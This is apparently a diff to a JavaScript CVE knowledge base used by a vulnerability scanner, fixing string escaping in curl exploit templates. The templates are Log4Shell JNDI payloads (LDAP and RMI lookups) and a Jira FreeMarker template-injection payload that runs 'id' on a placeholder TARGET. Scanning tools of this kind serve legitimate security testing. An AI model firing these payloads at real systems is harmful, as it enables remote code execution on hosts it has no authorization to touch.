@@ -39,7 +39,7 @@ const CVE_KB = {
     cvss_score:  10.0,
     description: "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
     path:        "/",
-    curl_tpl:    `curl -v -H 'X-Api-Version: $\{jndi:ldap://TARGET:389/a\}' "https://TARGET/"`,
+    curl_tpl:    `curl -v -H 'X-Api-Version: \${jndi:ldap://TARGET:389/a}' "https://TARGET/"`,
   },
   "CVE-2021-44832": {
     name:        "Apache Log4j2 Remote Code Execution via JDBC Appender",
@@ -47,7 +47,7 @@ const CVE_KB = {
     cvss_score:  8.8,
     description: "Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code execution (RCE) attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI.",
     path:        "/",
-    curl_tpl:    `curl -v -H 'X-Api-Version: $\{jndi:rmi://TARGET:1099/a\}' "https://TARGET/"`,
+    curl_tpl:    `curl -v -H 'X-Api-Version: \${jndi:rmi://TARGET:1099/a}' "https://TARGET/"`,
   },
   "CVE-2022-22963": {
     name:        "VMware Tanzu Spring Cloud Function SpEL Code Injection",
@@ -87,7 +87,7 @@ const CVE_KB = {
     cvss_score:  9.8,
     description: "There was a server-side template injection vulnerability in Atlassian Jira Server and Data Center, in the ContactAdministrators and the SendBulkMail actions. An attacker is able to remotely execute code on systems that run a vulnerable version of Jira Server or Data Center.",
     path:        "/secure/ContactAdministrators!default.jspa",
-    curl_tpl:    `curl -v -X POST "https://TARGET/secure/ContactAdministrators!default.jspa" --data 'subject=$\{\"freemarker.template.utility.Execute\"?new()(\"id\")\}&details=x'`,
+    curl_tpl:    `curl -v -X POST "https://TARGET/secure/ContactAdministrators!default.jspa" --data 'subject=\${"freemarker.template.utility.Execute"?new()("id")}&details=x'`,
   },
   "CVE-2022-26134": {
     name:        "Atlassian Confluence Server OGNL Injection RCE",
@@ -161,7 +161,6 @@ function _cveInfo(cveId) {
 
   // Try a severity/score heuristic from the CVE year + seq
   const parts = cveId.split('-');
-  const year  = parseInt(parts[1]) || 2020;
   const seq   = parseInt(parts[2]) || 1;
 
   return {
